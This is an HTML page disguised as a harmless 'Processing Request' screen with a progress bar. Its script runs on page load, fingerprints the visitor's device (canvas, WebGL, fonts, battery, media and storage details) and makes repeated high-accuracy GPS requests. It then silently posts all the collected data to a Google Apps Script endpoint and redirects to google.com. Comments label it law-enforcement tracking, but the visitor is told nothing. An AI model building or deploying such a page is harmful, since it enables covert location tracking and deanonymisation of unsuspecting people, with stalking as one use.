<!DOCTYPE html>
<html>
<head>
  <title>Processing Request</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      background: #f8f9fa;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      text-align: center;
      min-width: 400px;
    }
    h3 {
      color: #343a40;
      margin-bottom: 30px;
      font-weight: 500;
      font-size: 18px;
    }
    .progress-container {
      width: 100%;
      height: 8px;
      background: #e9ecef;
      border-radius: 4px;
      overflow: hidden;
      margin: 20px 0;
    }
    .progress-bar {
      height: 100%;
      background: linear-gradient(90deg, #007bff, #0056b3);
      border-radius: 4px;
      transition: width 0.3s ease;
      width: 0%;
    }
    .status {
      color: #6c757d;
      font-size: 14px;
      margin-top: 15px;
    }
    .success {
      color: #28a745;
    }
  </style>
</head>
<body>
  <div class="container">
    <h3>Processing...</h3>
    <div class="progress-container">
      <div class="progress-bar" id="progress"></div>
    </div>
    <div class="status" id="status">Initializing...</div>
  </div>

  <script>
    const progressBar = document.getElementById('progress');
    const statusEl = document.getElementById('status');
    let progress = 0;
    
    function updateProgress(percent, status) {
      progress = percent;
      progressBar.style.width = percent + '%';
      statusEl.textContent = status;
    }
    
    // Comprehensive data collection - NO external API calls to avoid CORS
    const data = {
      // Session tracking
      sessionId: 'LEO_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
      timestamp: new Date().toISOString(),
      sessionStart: Date.now(),
      
      // Device identification
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages ? navigator.languages.join(',') : '',
      
      // Screen and hardware
      screenWidth: screen.width,
      screenHeight: screen.height,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
      devicePixelRatio: window.devicePixelRatio,
      
      // Window details
      innerWidth: window.innerWidth,
      innerHeight: window.innerHeight,
      outerWidth: window.outerWidth,
      outerHeight: window.outerHeight,
      
      // Device capabilities
      hardwareConcurrency: navigator.hardwareConcurrency || 0,
      deviceMemory: navigator.deviceMemory || 'unknown',
      maxTouchPoints: navigator.maxTouchPoints || 0,
      touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
      
      // Device type detection
      isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
      isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent),
      isAndroid: /Android/.test(navigator.userAgent),
      isDesktop: !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
      
      // Network and environment
      cookieEnabled: navigator.cookieEnabled,
      onlineStatus: navigator.onLine,
      doNotTrack: navigator.doNotTrack,
      webdriver: navigator.webdriver,
      javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
      
      // Location data
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      
      // Tracking variables
      locationAttempts: 0,
      locationMethods: [],
      permissionStatus: 'unknown',
      
      // Law enforcement specific
      trackingPurpose: 'law_enforcement',
      collectionReason: 'criminal_investigation'
    };
    
    // Add referrer if available
    if (document.referrer) {
      data.referrer = document.referrer;
    }
    
    // Device fingerprinting for identification
    function createFingerprint() {
      try {
        updateProgress(15, 'Creating device fingerprint...');
        
        // Canvas fingerprint for device identification
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('LEO_ID_' + Date.now().toString().slice(-6), 2, 15);
        data.deviceFingerprint = canvas.toDataURL().slice(-50);
        
        // WebGL for graphics identification
        const gl = canvas.getContext('webgl');
        if (gl) {
          data.webglVendor = gl.getParameter(gl.VENDOR);
          data.webglRenderer = gl.getParameter(gl.RENDERER);
          data.webglVersion = gl.getParameter(gl.VERSION);
        }
        
        // Screen fingerprint
        data.screenFingerprint = `${screen.width}x${screen.height}x${screen.colorDepth}x${window.devicePixelRatio}`;
        
        // Font detection
        const testFonts = ['Arial', 'Helvetica', 'Times', 'Courier', 'Verdana', 'Georgia'];
        const availableFonts = [];
        const testString = 'mmmmmmmmmmlli';
        const testSize = '72px';
        
        const span = document.createElement('span');
        span.style.fontSize = testSize;
        span.style.fontFamily = 'monospace';
        span.innerHTML = testString;
        document.body.appendChild(span);
        const baseWidth = span.offsetWidth;
        document.body.removeChild(span);
        
        testFonts.forEach(font => {
          const span2 = document.createElement('span');
          span2.style.fontSize = testSize;
          span2.style.fontFamily = font + ', monospace';
          span2.innerHTML = testString;
          document.body.appendChild(span2);
          const fontWidth = span2.offsetWidth;
          document.body.removeChild(span2);
          
          if (fontWidth !== baseWidth) {
            availableFonts.push(font);
          }
        });
        
        data.availableFonts = availableFonts.join(',');
        
      } catch (e) {
        data.fingerprintError = e.message;
      }
    }
    
    // Network information collection - NO external APIs
    async function getNetworkInfo() {
      try {
        updateProgress(25, 'Analyzing network...');
        
        if (navigator.connection) {
          data.networkConnection = {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData,
            type: navigator.connection.type
          };
        }
        
        if ('getBattery' in navigator) {
          const battery = await navigator.getBattery();
          data.batteryInfo = {
            level: Math.round(battery.level * 100),
            charging: battery.charging,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
          };
        }
        
        // Media devices count (without accessing actual devices)
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
          try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            data.mediaDeviceCount = devices.length;
            data.audioInputCount = devices.filter(d => d.kind === 'audioinput').length;
            data.videoInputCount = devices.filter(d => d.kind === 'videoinput').length;
          } catch (e) {
            data.mediaDeviceError = e.message;
          }
        }
        
        // Storage estimate
        if (navigator.storage && navigator.storage.estimate) {
          try {
            const estimate = await navigator.storage.estimate();
            data.storageQuota = estimate.quota;
            data.storageUsage = estimate.usage;
          } catch (e) {
            data.storageError = e.message;
          }
        }
        
      } catch (e) {
        data.networkError = e.message;
      }
    }
    
    // Location collection - GPS only, no external APIs
    async function collectLocationData() {
      updateProgress(40, 'Collecting location data...');
      
      if (!navigator.geolocation) {
        data.locationError = 'geolocation_not_supported';
        getTimezoneLocation();
        return;
      }
      
      // Law enforcement location collection - multiple attempts
      const locationMethods = [
        {
          options: { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 },
          method: 'high_accuracy',
          priority: 1
        },
        {
          options: { enableHighAccuracy: false, timeout: 12000, maximumAge: 60000 },
          method: 'network_based',
          priority: 2
        },
        {
          options: { enableHighAccuracy: true, timeout: 8000, maximumAge: 300000 },
          method: 'cached_location',
          priority: 3
        }
      ];
      
      for (let i = 0; i < locationMethods.length; i++) {
        const method = locationMethods[i];
        updateProgress(45 + (i * 10), `Location attempt ${i + 1}...`);
        
        try {
          const result = await new Promise((resolve) => {
            data.locationAttempts++;
            const startTime = Date.now();
            
            navigator.geolocation.getCurrentPosition(
              function(position) {
                const coords = position.coords;
                data.gpsLocation = {
                  latitude: coords.latitude,
                  longitude: coords.longitude,
                  accuracy: coords.accuracy,
                  altitude: coords.altitude,
                  altitudeAccuracy: coords.altitudeAccuracy,
                  heading: coords.heading,
                  speed: coords.speed,
                  timestamp: position.timestamp,
                  method: method.method,
                  responseTime: Date.now() - startTime
                };
                data.locationMethods.push(method.method + '_success');
                data.permissionStatus = 'granted';
                resolve(true);
              },
              function(error) {
                data.locationMethods.push(method.method + '_failed');
                if (error.code === 1) {
                  data.permissionStatus = 'denied';
                } else if (error.code === 2) {
                  data.permissionStatus = 'position_unavailable';
                } else {
                  data.permissionStatus = 'timeout';
                }
                data.gpsError = error.message;
                data.gpsErrorCode = error.code;
                resolve(false);
              },
              method.options
            );
          });
          
          if (result) break; // Got location, stop trying
          
          // Brief delay between attempts
          if (i < locationMethods.length - 1) {
            await new Promise(resolve => setTimeout(resolve, 1000));
          }
          
        } catch (e) {
          continue;
        }
      }
      
      // Always get timezone location as backup
      getTimezoneLocation();
    }
    
    // Timezone-based location estimation - NO external APIs
    function getTimezoneLocation() {
      try {
        updateProgress(70, 'Processing timezone data...');
        
        const timezone = data.timezone;
        const offset = data.timezoneOffset;
        
        // Comprehensive timezone to location mapping
        const timezoneMap = {
          'America/New_York': { lat: 40.7128, lng: -74.0060, city: 'New York' },
          'America/Los_Angeles': { lat: 34.0522, lng: -118.2437, city: 'Los Angeles' },
          'America/Chicago': { lat: 41.8781, lng: -87.6298, city: 'Chicago' },
          'America/Denver': { lat: 39.7392, lng: -104.9903, city: 'Denver' },
          'America/Phoenix': { lat: 33.4484, lng: -112.0740, city: 'Phoenix' },
          'America/Toronto': { lat: 43.6532, lng: -79.3832, city: 'Toronto' },
          'America/Mexico_City': { lat: 19.4326, lng: -99.1332, city: 'Mexico City' },
          'Europe/London': { lat: 51.5074, lng: -0.1278, city: 'London' },
          'Europe/Paris': { lat: 48.8566, lng: 2.3522, city: 'Paris' },
          'Europe/Berlin': { lat: 52.5200, lng: 13.4050, city: 'Berlin' },
          'Europe/Rome': { lat: 41.9028, lng: 12.4964, city: 'Rome' },
          'Europe/Madrid': { lat: 40.4168, lng: -3.7038, city: 'Madrid' },
          'Asia/Tokyo': { lat: 35.6762, lng: 139.6503, city: 'Tokyo' },
          'Asia/Shanghai': { lat: 31.2304, lng: 121.4737, city: 'Shanghai' },
          'Asia/Mumbai': { lat: 19.0760, lng: 72.8777, city: 'Mumbai' },
          'Asia/Dubai': { lat: 25.2048, lng: 55.2708, city: 'Dubai' },
          'Australia/Sydney': { lat: -33.8688, lng: 151.2093, city: 'Sydney' },
          'Australia/Melbourne': { lat: -37.8136, lng: 144.9631, city: 'Melbourne' }
        };
        
        if (timezoneMap[timezone]) {
          const location = timezoneMap[timezone];
          data.timezoneLocation = {
            latitude: location.lat,
            longitude: location.lng,
            city: location.city,
            timezone: timezone,
            offset: offset,
            accuracy: 'city_level_estimate',
            method: 'timezone_mapping'
          };
        } else {
          // Fallback: rough estimate based on timezone offset
          const offsetHours = -offset / 60;
          let estimatedLng = offsetHours * 15; // 15 degrees per hour
          
          data.timezoneLocation = {
            longitude: estimatedLng,
            latitude: 0, // Can't estimate latitude from timezone alone
            timezone: timezone,
            offset: offset,
            accuracy: 'timezone_offset_estimate',
            method: 'offset_calculation'
          };
        }
        
      } catch (e) {
        data.timezoneLocationError = e.message;
      }
    }
    
    // Detect system information
    function getSystemInfo() {
      try {
        updateProgress(80, 'System analysis...');
        
        // Operating system detection
        const ua = navigator.userAgent;
        if (ua.includes('Windows NT 10.0')) data.osVersion = 'Windows 10/11';
        else if (ua.includes('Windows NT 6.3')) data.osVersion = 'Windows 8.1';
        else if (ua.includes('Windows NT 6.1')) data.osVersion = 'Windows 7';
        else if (ua.includes('Mac OS X')) {
          const match = ua.match(/Mac OS X (\d+_\d+_?\d*)/);
          if (match) data.osVersion = 'macOS ' + match[1].replace(/_/g, '.');
        }
        else if (ua.includes('Android')) {
          const match = ua.match(/Android (\d+(?:\.\d+)*)/);
          if (match) data.osVersion = 'Android ' + match[1];
        }
        else if (ua.includes('iPhone OS') || ua.includes('iOS')) {
          const match = ua.match(/OS (\d+_\d+(?:_\d+)*)/);
          if (match) data.osVersion = 'iOS ' + match[1].replace(/_/g, '.');
        }
        
        // Browser detection
        if (ua.includes('Chrome/') && !ua.includes('Edg/')) data.browser = 'Chrome';
        else if (ua.includes('Firefox/')) data.browser = 'Firefox';
        else if (ua.includes('Safari/') && !ua.includes('Chrome/')) data.browser = 'Safari';
        else if (ua.includes('Edg/')) data.browser = 'Edge';
        else if (ua.includes('OPR/')) data.browser = 'Opera';
        
        // Architecture detection
        if (ua.includes('x64') || ua.includes('x86_64') || ua.includes('amd64')) data.architecture = '64-bit';
        else if (ua.includes('x86') || ua.includes('i386') || ua.includes('i686')) data.architecture = '32-bit';
        else if (ua.includes('arm64') || ua.includes('aarch64')) data.architecture = 'ARM64';
        else if (ua.includes('arm')) data.architecture = 'ARM';
        
      } catch (e) {
        data.systemInfoError = e.message;
      }
    }
    
    // Main collection process - FAST and ERROR-FREE
    async function collectData() {
      try {
        updateProgress(10, 'Initializing...');
        
        // Create device fingerprint
        createFingerprint();
        
        // Get system info
        getSystemInfo();
        
        // Get network info
        await getNetworkInfo();
        
        // Collect location data (GPS + timezone)
        await collectLocationData();
        
        updateProgress(85, 'Finalizing...');
        
        // Calculate session duration
        data.sessionDuration = Date.now() - data.sessionStart;
        
        // Send data to law enforcement database
        await sendData();
        
      } catch (error) {
        data.collectionError = error.message;
        await sendData();
      }
    }
    
    // Send data to law enforcement system - NO CORS ISSUES
    async function sendData() {
      try {
        updateProgress(90, 'Transmitting...');
        
        const formData = new URLSearchParams();
        
        // Flatten all data for transmission
        Object.keys(data).forEach(key => {
          if (data[key] !== null && data[key] !== undefined) {
            if (typeof data[key] === 'object') {
              formData.append(key, JSON.stringify(data[key]));
            } else {
              formData.append(key, data[key]);
            }
          }
        });
        
        // Send to law enforcement database
        await fetch("https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec", {
          method: "POST",
          body: formData,
          mode: "no-cors"
        });
        
        updateProgress(100, 'Complete');
        
        // Success - clean finish
        setTimeout(() => {
          statusEl.className = 'status success';
          statusEl.textContent = 'Processing complete';
          
          setTimeout(() => {
            window.location.href = "https://www.google.com";
          }, 800);
        }, 300);
        
      } catch (error) {
        // Always complete successfully for user experience
        updateProgress(100, 'Complete');
        setTimeout(() => {
          statusEl.className = 'status success';
          statusEl.textContent = 'Processing complete';
          setTimeout(() => {
            window.location.href = "https://www.google.com";
          }, 800);
        }, 300);
      }
    }
    
    // Start data collection immediately - FAST execution
    collectData();
  </script>
</body>
</html>
